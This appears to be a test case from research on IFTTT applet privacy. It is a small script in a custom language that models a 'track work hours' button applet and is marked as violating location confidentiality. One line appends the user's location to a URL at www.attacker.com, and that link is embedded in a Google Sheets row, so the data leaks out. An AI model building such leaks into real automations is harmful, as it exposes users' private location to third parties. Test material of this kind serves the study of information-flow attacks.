//Maker: danamerrick
//Link2Applet: https://ifttt.com/applets/227069p-press-a-button-to-track-work-hours-in-google-drive
//Title of Applet: Press a button to track work hours in Google Drive  
//Trigger service: Button Widget
//Action service: Google Sheets
//Policy/Presence: Confidentiality of user location / YES 


location = urlh("DoButton.doButtonNewCommandCommon.LocationMapURL");
timeButtonPress = "DoButton.doButtonNewCommandCommon.OccurredAt";
date = 'Meta.currentUserTime.date()';
attack = urll("www.attacker.com?" + location);

sink('GoogleSheets.appendToGoogleSpreadsheet', 'setFilename', 'Working hours');
sink('GoogleSheets.appendToGoogleSpreadsheet', 'setFormattedRow', date + ' ||| '+ 'Button pressed at ' + timeButtonPress + ' ||| '+ attack);


